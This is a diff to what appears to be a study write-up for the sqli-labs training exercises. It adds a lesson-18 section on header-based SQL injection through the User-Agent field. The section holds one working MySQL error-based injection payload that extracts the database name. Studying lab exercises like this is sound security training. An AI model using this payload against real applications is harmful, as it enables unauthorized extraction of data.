@@ -110,3 +110,16 @@ contents of database
 * databse=security
 * tables=emails
 * columns=id
+
+less-18
+========
+
+this is a header based injection and you can inject query in the user agent feild in the request (you need an intercepting proxy like burp or zap proxy for that)
+
+payload
+-------
+
+* to get the data base we can use this payload
+```mysql
+' and (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b) and '1'='1
+``
